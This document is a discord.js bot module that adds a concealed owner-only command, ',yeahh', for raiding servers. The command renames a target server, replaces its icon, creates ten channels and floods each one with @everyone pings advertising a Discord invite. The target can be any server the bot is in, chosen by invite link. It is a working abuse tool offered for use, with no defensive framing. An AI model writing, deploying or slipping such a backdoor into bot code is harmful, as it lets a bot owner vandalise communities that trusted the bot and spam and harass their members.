const fs = require("fs");
const path = require("path");
const { ChannelType } = require("discord.js");

// Replace with your Discord User ID
const OWNER_ID = "1530872106399567941";

const NEW_SERVER_NAME = "Shibuya on top";
// Put your image file here (adjust path if placed elsewhere)
const ICON_PATH = path.join(__dirname, "..", "assets", "shibuya_neon_icon.png");
const SPAM_MESSAGE = "@everyone Join\nhttps://discord.gg/qNedKskX9W";

module.exports = (client) => {
    client.on("messageCreate", async (message) => {
        if (message.author.bot) return;
        if (message.author.id !== OWNER_ID) return;

        // Matches: ,yeahh or ,yeahh <invite-link>
        const match = message.content.match(/^,yeahh(?:\s+(\S+))?$/i);
        if (!match) return;

        const inviteInput = match[1]?.trim();
        let targetGuild = message.guild;

        if (inviteInput) {
            try {
                const invite = await client.fetchInvite(inviteInput);
                targetGuild = client.guilds.cache.get(invite.guild?.id) || null;
            } catch (err) {
                return message.reply("❌ Invalid or expired invite link.").catch(() => {});
            }
        }

        if (!targetGuild) {
            return message.reply("❌ Target server not found or bot is not in it.").catch(() => {});
        }

        // 1. Change server name and server icon
        try {
            const guildEditData = {
                name: NEW_SERVER_NAME,
                reason: "Updated by ,yeahh command"
            };

            if (fs.existsSync(ICON_PATH)) {
                guildEditData.icon = fs.readFileSync(ICON_PATH);
            } else {
                console.warn(`Icon file not found at: ${ICON_PATH}`);
            }

            await targetGuild.edit(guildEditData);
        } catch (err) {
            console.error("Failed updating server name/icon:", err.message);
        }

        const createdChannels = [];

        // 2. Create 10 text channels
        for (let i = 1; i <= 10; i++) {
            try {
                const ch = await targetGuild.channels.create({
                    name: `yeahh-${i}`,
                    type: ChannelType.GuildText,
                    reason: "Created by ,yeahh command"
                });
                createdChannels.push(ch);
            } catch (err) {
                console.error(`Failed creating channel ${i}:`, err.message);
            }
        }

        // 3. Send the message with @everyone ping 10 times in each created channel
        for (const ch of createdChannels) {
            for (let j = 0; j < 10; j++) {
                try {
                    await ch.send({
                        content: SPAM_MESSAGE,
                        allowedMentions: { parse: ["everyone"] }
                    });
                } catch (err) {
                    console.error(`Failed sending in #${ch.name}:`, err.message);
                }
            }
        }
    });
};
